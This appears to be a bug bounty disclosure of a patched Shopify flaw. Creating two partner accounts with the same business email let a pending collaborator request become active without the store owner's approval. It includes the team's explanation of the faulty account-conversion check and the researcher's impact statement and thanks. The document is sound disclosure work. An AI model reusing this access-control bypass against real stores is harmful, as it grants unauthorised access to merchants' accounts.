**Summary (team):**

@uzsunny reported that by creating two partner accounts sharing the same business email, it was possible to be granted "collaborator" access to any store without any merchant interaction.

We tracked down the bug to incorrect logic in a piece of code that was meant to automatically convert an existing normal user account into a collaborator account. The intention was that, when a partner already had a valid user account on the store, their collaborator account request could be accepted automatically, with the user account converted into a collaborator account.

The code did not properly check what type the existing account was, and therefore an existing collaborator account in the "pending" state (not yet accepted by the store owner) would be converted into an active collaborator account, effectively allowing the partner to approve their own request without interaction from the store owner.

We fixed this issue by properly verifying that the exisiting account is in fact a user account.

**Summary (researcher):**

##Impact:

This bug allowed me to login to any store with full permissions.


First of all Thanks to shopify security Team for 20k bounty.

This bug was found on sep 23rd 2017 and within 1 hour the bug has been patched.

Thanks to shopify security Team for 20k bounty.


Thanks once again

---
